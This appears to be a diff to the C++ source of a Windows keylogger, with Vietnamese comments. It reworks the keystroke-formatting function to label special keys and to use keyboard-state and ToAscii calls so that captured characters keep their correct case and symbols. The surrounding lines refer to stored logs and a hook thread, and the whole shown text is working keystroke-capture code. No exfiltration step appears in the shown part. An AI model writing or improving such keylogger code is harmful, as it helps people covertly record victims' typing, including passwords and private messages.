@@ -45,17 +45,80 @@ std::vector<std::string> KeyLogger::GetAndClearLogs() {
 
 // 3. Hàm định dạng chuỗi (Logic của bạn)
 std::string KeyLogger::logKeystroke(int key) {
-    if (key == VK_BACK) return "[BACKSPACE]";
-    else if (key == VK_RETURN) return "[ENTER]";
-    else if (key == VK_SPACE) return " ";
-    else if (key == VK_TAB) return "[TAB]";
-    else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT) return ""; // Thường không log Shift riêng lẻ
-    else if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL) return "[CTRL]";
-    else if (key == VK_ESCAPE) return "[ESC]";
-    else if (key >= 'A' && key <= 'Z') return std::string(1, char(key));
-    else if (key >= '0' && key <= '9') return std::string(1, char(key));
-    // Có thể thêm logic xử lý Capslock để viết hoa/thường nếu cần
-    else return "[UNK]";
+    std::string result = "";
+
+    // --- 1. XỬ LÝ CÁC PHÍM CHỨC NĂNG (SPECIAL KEYS) ---
+    // Chúng ta return ngay để không bị xử lý nhầm thành ký tự văn bản
+    switch (key) {
+    case VK_RETURN: return "[ENTER]\n";
+    case VK_BACK:   return "[BACK]";
+    case VK_SPACE:  return " ";
+    case VK_TAB:    return "[TAB]";
+    case VK_ESCAPE: return "[ESC]";
+
+    case VK_DELETE: return "[DEL]";
+    case VK_INSERT: return "[INS]";
+    case VK_HOME:   return "[HOME]";
+    case VK_END:    return "[END]";
+    case VK_PRIOR:  return "[PGUP]"; // Page Up
+    case VK_NEXT:   return "[PGDN]"; // Page Down
+
+    case VK_LEFT:   return "[LEFT]";
+    case VK_UP:     return "[UP]";
+    case VK_RIGHT:  return "[RIGHT]";
+    case VK_DOWN:   return "[DOWN]";
+
+        // Bỏ qua các phím bổ trợ nếu chúng đứng một mình (để đỡ rác log)
+    case VK_SHIFT:   case VK_LSHIFT:   case VK_RSHIFT:
+    case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL:
+    case VK_MENU:    case VK_LMENU:    case VK_RMENU: // Alt
+    case VK_CAPITAL: case VK_NUMLOCK:  case VK_SCROLL:
+        return "";
+
+        // Các phím F1 - F12
+    case VK_F1: return "[F1]"; case VK_F2: return "[F2]";
+    case VK_F3: return "[F3]"; case VK_F4: return "[F4]";
+    case VK_F5: return "[F5]"; case VK_F6: return "[F6]";
+    case VK_F7: return "[F7]"; case VK_F8: return "[F8]";
+    case VK_F9: return "[F9]"; case VK_F10: return "[F10]";
+    case VK_F11: return "[F11]"; case VK_F12: return "[F12]";
+    }
+
+
+    BYTE keyboardState[256];
+    GetKeyboardState(keyboardState);
+
+
+    if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
+        keyboardState[VK_SHIFT] = 0x80;
+    }
+    if (GetKeyState(VK_CAPITAL) & 0x0001) {
+        keyboardState[VK_CAPITAL] = 0x01;
+    }
+
+    // B3: Dùng ToAscii để dịch mã phím + trạng thái phím -> Ký tự
+    WORD asciiChar = 0;
+    // MapVirtualKey chuyển VK code sang Scan code
+    UINT scanCode = MapVirtualKey(key, MAPVK_VK_TO_VSC);
+
+    // Hàm ToAscii trả về số lượng ký tự copy được vào buffer
+    int len = ToAscii(key, scanCode, keyboardState, &asciiChar, 0);
+
+    if (len == 1) {
+        // Có 1 ký tự trả về (Ví dụ: 'a', 'A', '@', '1')
+        result = std::string(1, (char)asciiChar);
+    }
+    else if (len == 2) {
+
+        char c = (char)asciiChar;
+        result = std::string(1, c);
+    }
+    else {
+
+        return "";
+    }
+
+    return result;
 }
 
 // 4. Luồng chạy Hook
